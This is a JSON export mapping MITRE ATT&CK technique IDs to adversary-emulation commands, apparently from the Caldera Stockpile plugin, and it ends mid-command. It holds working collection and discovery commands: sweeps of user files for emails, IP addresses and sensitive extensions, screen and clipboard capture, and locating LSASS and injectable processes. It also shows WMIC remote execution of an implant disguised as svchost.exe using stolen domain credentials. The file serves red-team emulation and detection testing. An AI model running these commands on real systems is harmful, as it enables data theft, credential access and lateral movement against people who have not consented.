{"last_updated": "2020-11-02T14:40:26.690202", "techniques": [{"technique_id": "T1005", "commands": [{"source": "data/abilities/collection/02de522f-7e0a-4544-8afc-0c195f400f5f.yml", "command": "pip install stormssh && storm list\n", "name": "Search for valid SSH commands in the config file"}, {"source": "data/abilities/collection/02de522f-7e0a-4544-8afc-0c195f400f5f.yml", "command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'\n", "name": "Search for valid SSH commands in the config file"}, {"source": "data/abilities/collection/1f7ff232-ebf8-42bf-a3c4-657855794cfe.yml", "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n", "name": "Grep for all emails for the given target company"}, {"source": "data/abilities/collection/89955f55-529d-4d58-bed4-fed9e42515ec.yml", "command": "curl #{remote.host.socket}\n", "name": "See the raw content of a socket"}, {"source": "data/abilities/collection/89955f55-529d-4d58-bed4-fed9e42515ec.yml", "command": "curl #{remote.host.socket}\n", "name": "See the raw content of a socket"}, {"source": "data/abilities/collection/90c2efaa-8205-480d-8bb6-61d90dbaf81b.yml", "command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "name": "Locate files deemed sensitive"}, {"source": "data/abilities/collection/90c2efaa-8205-480d-8bb6-61d90dbaf81b.yml", "command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "name": "Locate files deemed sensitive"}, {"source": "data/abilities/collection/90c2efaa-8205-480d-8bb6-61d90dbaf81b.yml", "command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "name": "Locate files deemed sensitive"}, {"source": "data/abilities/collection/d69e8660-62c9-431e-87eb-8cf6bd4e35cf.yml", "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n", "name": "Grep for IP addresses in file system per user"}], "parsed_datasets": [{"Mitre Stockpile - Search for valid SSH commands in the config file": {"id": "02de522f-7e0a-4544-8afc-0c195f400f5f", "name": "Parse SSH config", "description": "Search for valid SSH commands in the config file", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "platforms": {"darwin": {"sh": {"command": "pip install stormssh && storm list\n", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}, "linux": {"sh": {"command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'\n", "parsers": {"plugins.stockpile.app.parsers.ssh": [{"source": "remote.ssh.cmd"}]}}}}}}, {"Mitre Stockpile - Grep for all emails for the given target company": {"id": "1f7ff232-ebf8-42bf-a3c4-657855794cfe", "name": "Find company emails", "description": "Grep for all emails for the given target company", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "platforms": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}]}}, {"Mitre Stockpile - See the raw content of a socket": {"id": "89955f55-529d-4d58-bed4-fed9e42515ec", "name": "cURL socket address", "description": "See the raw content of a socket", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "platforms": {"darwin": {"sh": {"command": "curl #{remote.host.socket}\n"}}, "linux": {"sh": {"command": "curl #{remote.host.socket}\n"}}}}}, {"Mitre Stockpile - Locate files deemed sensitive": {"id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "name": "Find files", "description": "Locate files deemed sensitive", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "platforms": {"darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}, "windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path"}]}}}}}}, {"Mitre Stockpile - Grep for IP addresses in file system per user": {"id": "d69e8660-62c9-431e-87eb-8cf6bd4e35cf", "name": "Find IP addresses", "description": "Grep for IP addresses in file system per user", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "platforms": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}]}}], "command_list": ["pip install stormssh && storm list", "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'", "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;", "curl #{remote.host.socket}", "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;", "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5", "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5", "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1113", "commands": [{"source": "data/abilities/collection/316251ed-6a28-4013-812b-ddf5b5b007f8.yml", "command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n", "name": "capture the contents of the screen"}, {"source": "data/abilities/collection/316251ed-6a28-4013-812b-ddf5b5b007f8.yml", "command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;\n", "name": "capture the contents of the screen"}], "parsed_datasets": [{"Mitre Stockpile - capture the contents of the screen": {"id": "316251ed-6a28-4013-812b-ddf5b5b007f8", "name": "Screen Capture", "description": "capture the contents of the screen", "tactic": "collection", "technique": {"attack_id": "T1113", "name": "Screen Capture"}, "platforms": {"darwin": {"sh": {"command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n", "cleanup": "for i in {1..5}; do /bin/rm screen-$i.png; done;", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.screenshot.png"}]}}}, "windows": {"psh,pwsh": {"command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;\n", "cleanup": "$filePath = \"$HOME\\Desktop\\screenshot.png\"; if (Test-Path -Path $filePath) { del $filePath; };", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.screenshot.png"}]}}}}}}], "command_list": ["$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;", "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1059.001", "commands": [{"source": "data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml", "command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;", "name": "User enumeration"}], "parsed_datasets": [{"Mitre Stockpile - User enumeration": {"id": "55678719-e76e-4df9-92aa-10655bbd1cf4", "description": "User enumeration", "name": "cmd.exe information gathering", "tactic": "collection", "technique": {"attack_id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell"}, "platforms": {"windows": {"psh": {"command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"}}}}}], "command_list": ["cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1059.001", "commands": [{"source": "data/abilities/collection/702bfdd2-9947-4eda-b551-c3a1ea9a59a2.yml", "command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";", "name": "System Information Gathering Script"}], "parsed_datasets": [{"Mitre Stockpile - System Information Gathering Script": {"id": "702bfdd2-9947-4eda-b551-c3a1ea9a59a2", "description": "System Information Gathering Script", "name": "PowerShell information gathering", "tactic": "collection", "technique": {"attack_id": "T1059.001", "name": "Command and Scripting Interpreter: PowerShell"}, "platforms": {"windows": {"psh,pwsh": {"command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"}}}}}], "command_list": ["powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1047", "commands": [{"source": "data/abilities/collection/94f21386-9547-43c4-99df-938ab05d45ce.yml", "command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n", "name": "Capture process id, executable path, pid and parent pid before writing to disk"}, {"source": "data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml", "command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh\";\n", "name": "Remotely executes 54ndc47 over WMI"}, {"source": "data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml", "command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd\";\n", "name": "Remotely executes 54ndc47 over WMI"}, {"source": "data/abilities/execution/ece5dde3-d370-4c20-b213-a1f424aa8d03.yml", "command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n", "name": "Remotely executes 54ndc47 over WMI"}], "parsed_datasets": [{"Mitre Stockpile - Capture process id, executable path, pid and parent pid before writing to disk": {"id": "94f21386-9547-43c4-99df-938ab05d45ce", "name": "WMIC Process Enumeration", "description": "Capture process id, executable path, pid and parent pid before writing to disk", "tactic": "collection", "technique": {"attack_id": "T1047", "name": "WMIC"}, "platforms": {"windows": {"psh": {"command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}}}, {"Mitre Stockpile - Remotely executes 54ndc47 over WMI": {"id": "2a32e46f-5346-45d3-9475-52b857c05342", "name": "Start 54ndc47 (WMI)", "description": "Remotely executes 54ndc47 over WMI", "tactic": "execution", "technique": {"attack_id": "T1047", "name": "Windows Management Instrumentation"}, "platforms": {"windows": {"psh": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh\";\n", "cleanup": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where \"ExecutablePath='C:\\\\Users\\\\Public\\\\svchost.exe'\" call terminate;\n"}, "cmd": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd\";\n", "cleanup": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process where \"ExecutablePath='C:\\\\Users\\\\Public\\\\svchost.exe'\" call terminate;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.basic": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}]}}, {"Mitre Stockpile - Remotely executes 54ndc47 over WMI": {"id": "ece5dde3-d370-4c20-b213-a1f424aa8d03", "name": "Start 54ndc47 (WMI)", "description": "Remotely executes 54ndc47 over WMI", "tactic": "execution", "technique": {"attack_id": "T1047", "name": "Windows Management Instrumentation"}, "platforms": {"windows": {"psh": {"command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";\n", "cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"taskkill /f /im s4ndc4t.exe\"\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.basic": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, {"plugins.stockpile.app.requirements.no_backwards_movement": [{"source": "remote.host.fqdn"}]}]}}], "command_list": ["wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log", "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd\";", "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh\";", "wmic /node:`\"#{remote.host.fqdn}`\" /user:`\"#{domain.user.name}`\" /password:`\"#{domain.user.password}`\" process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group}\";"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1115", "commands": [{"source": "data/abilities/collection/b007fe0c-c6b0-4fda-915c-255bbc070de2.yml", "command": "pbpaste\n", "name": "copy the contents for the clipboard and print them"}, {"source": "data/abilities/collection/b007fe0c-c6b0-4fda-915c-255bbc070de2.yml", "command": "Get-Clipboard -raw\n", "name": "copy the contents for the clipboard and print them"}, {"source": "data/abilities/collection/b007fe0c-c6b0-4fda-915c-255bbc070de2.yml", "command": "xclip -o\n", "name": "copy the contents for the clipboard and print them"}], "parsed_datasets": [{"Mitre Stockpile - copy the contents for the clipboard and print them": {"id": "b007fe0c-c6b0-4fda-915c-255bbc070de2", "name": "Copy Clipboard", "description": "copy the contents for the clipboard and print them", "tactic": "collection", "technique": {"attack_id": "T1115", "name": "Clipboard Data"}, "platforms": {"darwin": {"sh": {"command": "pbpaste\n"}}, "windows": {"psh,pwsh": {"command": "Get-Clipboard -raw\n"}}, "linux": {"sh": {"command": "xclip -o\n"}}}}}], "command_list": ["Get-Clipboard -raw", "xclip -o", "pbpaste"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1057", "commands": [{"source": "data/abilities/collection/cc191baa-7472-4386-a2f4-42f203f1acfd.yml", "command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n", "name": "Process discovery via SysInternals pstool"}, {"source": "data/abilities/discovery/0093c0e0-68b6-4cab-b0d4-2b40b3c78f71.yml", "command": "acrnctl list\n", "name": "Enumerate running virtual machines on hypervisor"}, {"source": "data/abilities/discovery/05cda6f6-2b1b-462e-bff1-845af94343f7.yml", "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n", "name": "Discovers processes that the current user has the ability to access and selects an injectable one"}, {"source": "data/abilities/discovery/0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7.yml", "command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n", "name": "Get process info for LSASS"}, {"source": "data/abilities/discovery/335cea7b-bec0-48c6-adfb-6066070f5f68.yml", "command": "ps\n", "name": "Display information about current system processes"}, {"source": "data/abilities/discovery/335cea7b-bec0-48c6-adfb-6066070f5f68.yml", "command": "ps\n", "name": "Display information about current system processes"}, {"source": "data/abilities/discovery/335cea7b-bec0-48c6-adfb-6066070f5f68.yml", "command": "get-process\n", "name": "Display information about current system processes"}, {"source": "data/abilities/discovery/3b5db901-2cb8-4df7-8043-c4628a6a5d5a.yml", "command": "ps aux | grep #{host.user.name}\n", "name": "Get process info for processes running as a user"}, {"source": "data/abilities/discovery/3b5db901-2cb8-4df7-8043-c4628a6a5d5a.yml", "command": "ps aux | grep #{host.user.name}\n", "name": "Get process info for processes running as a user"}, {"source": "data/abilities/discovery/3b5db901-2cb8-4df7-8043-c4628a6a5d5a.yml", "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n", "name": "Get process info for processes running as a user"}, {"source": "data/abilities/discovery/4d9b079c-9ede-4116-8b14-72ad3a5533af.yml", "command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n", "name": "Capture running processes via PowerShell"}, {"source": "data/abilities/discovery/5a39d7ed-45c9-4a79-b581-e5fb99e24f65.yml", "command": "Get-Process", "name": "Identify system processes"}, {"source": "data/abilities/discovery/5a39d7ed-45c9-4a79-b581-e5fb99e24f65.yml", "command": "tasklist", "name": "Identify system processes"}, {"source": "data/abilities/discovery/5a39d7ed-45c9-4a79-b581-e5fb99e24f65.yml", "command": "ps aux", "name": "Identify system processes"}, {"source": "data/abilities/discovery/5a39d7ed-45c9-4a79-b581-e5fb99e24f65.yml", "command": "ps aux", "name": "Identify system processes"}, {"source": "data/abilities/discovery/8adf02e8-6e71-4244-886c-98c402857404.yml", "command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n", "name": "Capture running processes and their loaded DLLs"}], "parsed_datasets": [{"Mitre Stockpile - Process discovery via SysInternals pstool": {"id": "cc191baa-7472-4386-a2f4-42f203f1acfd", "name": "SysInternals PSTool Process Discovery", "description": "Process discovery via SysInternals pstool", "tactic": "collection", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh,pwsh": {"command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"}}}}}, {"Mitre Stockpile - Enumerate running virtual machines on hypervisor": {"id": "0093c0e0-68b6-4cab-b0d4-2b40b3c78f71", "name": "enumerate VMs", "description": "Enumerate running virtual machines on hypervisor", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"linux": {"sh": {"command": "acrnctl list\n", "parsers": {"plugins.stockpile.app.parsers.acrn": [{"source": "hypervisor.vm.name"}]}}}}}}, {"Mitre Stockpile - Discovers processes that the current user has the ability to access and selects an injectable one": {"id": "05cda6f6-2b1b-462e-bff1-845af94343f7", "name": "Discover injectable process", "description": "Discovers processes that the current user has the ability to access and selects an injectable one", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "custom_parser_vals": {"json_key": "Id", "json_type": "int"}}]}}}}}}, {"Mitre Stockpile - Get process info for LSASS": {"id": "0bff4ee7-42a4-4bde-b09a-9d79d8b9edd7", "name": "Find LSASS", "description": "Get process info for LSASS", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh": {"command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "host.process.id", "custom_parser_vals": {"json_key": "Id", "json_type": "int"}}]}}, "cmd": {"build_target": "GetLsass.exe", "language": "csharp", "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabLsassProcess()\n        {\n            Process[] allProc = Process.GetProcessesByName(\"lsass\");\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabLsassProcess();\n        }\n    }\n}\n"}}}}}, {"Mitre Stockpile - Display information about current system processes": {"id": "335cea7b-bec0-48c6-adfb-6066070f5f68", "name": "View Processes", "description": "Display information about current system processes", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"darwin": {"sh": {"command": "ps\n"}}, "linux": {"sh": {"command": "ps\n"}}, "windows": {"psh": {"command": "get-process\n"}}}}}, {"Mitre Stockpile - Get process info for processes running as a user": {"id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "name": "Find user processes", "description": "Get process info for processes running as a user", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"darwin": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "linux": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}]}}, {"Mitre Stockpile - Capture running processes via PowerShell": {"id": "4d9b079c-9ede-4116-8b14-72ad3a5533af", "name": "PowerShell Process Enumeration", "description": "Capture running processes via PowerShell", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh,pwsh": {"command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}}}, {"Mitre Stockpile - Identify system processes": {"id": "5a39d7ed-45c9-4a79-b581-e5fb99e24f65", "name": "System processes", "description": "Identify system processes", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh": {"command": "Get-Process"}, "cmd": {"command": "tasklist"}, "donut_amd64": {"build_target": "ProcessDump.donut", "language": "csharp", "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabAllProcesses()\n        {\n            Process[] allProc = Process.GetProcesses();\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabAllProcesses();\n        }\n    }\n}\n"}}, "darwin": {"sh": {"command": "ps aux"}}, "linux": {"sh": {"command": "ps aux"}}}}}, {"Mitre Stockpile - Capture running processes and their loaded DLLs": {"id": "8adf02e8-6e71-4244-886c-98c402857404", "name": "tasklist Process Enumeration", "description": "Capture running processes and their loaded DLLs", "tactic": "discovery", "technique": {"attack_id": "T1057", "name": "Process Discovery"}, "platforms": {"windows": {"psh": {"command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n"}}}}}], "command_list": ["$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse", "acrnctl list", "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json", "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json", "get-process", "ps", "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    